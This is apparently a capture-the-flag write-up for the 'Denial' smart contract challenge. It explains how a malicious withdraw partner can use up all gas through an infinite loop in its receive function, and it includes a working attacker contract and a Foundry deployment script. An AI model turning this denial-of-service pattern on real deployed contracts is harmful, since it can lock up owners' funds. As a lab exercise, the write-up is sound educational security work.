# Denial   
The goal of this challenge is to prevent the `owner` from `withdrawing` funds when they call the `withdraw()` function, while ensuring the contract still has funds and the transaction uses 1M gas or less.

The `withdraw()` function sends 1% of the contract’s Ether to a `partner` address using a low-level `call`. This is where the vulnerability lies. Since `call` forwards a limited amount of gas (63/64th of the remaining gas), we can exploit this to perform a Denial of Service (DoS) attack by consuming all the gas in the `receive` or `fallback` function of the partner contract.

#### Exploitation Strategy
1. Set Ourselves as the Withdraw `Partner`: We need to become the `partner` address so that the call in `withdraw()` sends Ether to our contract.
2. Consume All Gas: In our contract’s `receive` function, we can create an infinite loop or an operation that consumes all the gas, preventing the rest of the `withdraw()` function from executing.

I created a smart contract and a script to automate the exploitation process:

Solving.sol:   
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract Solving {

    function solve(address _victim) external {
        _victim.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
    }

    receive() external payable {
        while (true) {}
    }
}

```
SolvingScript.s.sol:   
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";
import {Solving} from "src/Solving.sol";

contract SolvingScript is Script {

    Solving solving;
    address victim = ; // Your instance address

    function run() external {
        vm.startBroadcast();
        solving = new Solving();
        solving.solve(victim);
        vm.stopBroadcast();
    }
}
```